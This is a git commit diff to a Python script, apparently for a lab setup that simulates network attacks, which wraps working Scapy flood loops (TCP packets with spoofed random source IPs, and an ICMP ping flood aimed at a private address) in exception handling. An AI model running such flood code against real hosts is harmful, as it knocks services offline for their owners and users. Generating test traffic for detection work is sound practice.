e8c8b1ab6cd5394f54e4a474e801eb99621fe8c7
KaleiGan <50327541+KaleiGan@users.noreply.github.com>
2024-04-18 00:20:25 +0200

    update_s

--- simulation_attacks.py
+++ simulation_attacks.py
@@ -24,22 +24,29 @@ async def simulate_attack(target_ip):
 
     num_packets = random.randint(500, 10000) if attack_type == 'ddos' else random.randint(100, 2000)
 
-    if attack_type == 'ddos':
-        for _ in range(num_packets):
-            spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
-            packet = IP(src=spoofed_ip, dst=target_ip, tos=attack_codes[attack_type])/TCP(dport=random.randint(1, 65535))
-            send(packet, verbose=0)
-    elif attack_type == 'ping_flood':
-        for _ in range(num_packets):
-            packet = IP(dst=target_ip, tos=attack_codes[attack_type])/ICMP()
-            send(packet, verbose=0)
-
-    await send_attack_notification(attack_type, is_start=False)
+    try:
+        if attack_type == 'ddos':
+            for _ in range(num_packets):
+                spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+                packet = IP(src=spoofed_ip, dst=target_ip, tos=attack_codes[attack_type])/TCP(dport=random.randint(1, 65535))
+                send(packet, verbose=0)
+        elif attack_type == 'ping_flood':
+            for _ in range(num_packets):
+                packet = IP(dst=target_ip, tos=attack_codes[attack_type])/ICMP()
+                send(packet, verbose=0)
+    finally:
+        # Ensure the attack end notification is sent even if the script is interrupted
+        await send_attack_notification(attack_type, is_start=False)
 
 if __name__ == "__main__":
     target_ip = "192.168.1.18"
     while True:
-        asyncio.run(simulate_attack(target_ip))
-        sleep_time = random.randint(10, 60)
-        print(f"Waiting {sleep_time} seconds before next attack")
-        sleep(sleep_time)
+        try:
+            asyncio.run(simulate_attack(target_ip))
+            sleep_time = random.randint(10, 60)
+            print(f"Waiting {sleep_time} seconds before next attack")
+            sleep(sleep_time)
+        except KeyboardInterrupt:
+            print("Interrupt received, stopping attacks.")
+            asyncio.run(send_attack_notification("normal", is_start=False))
+            break
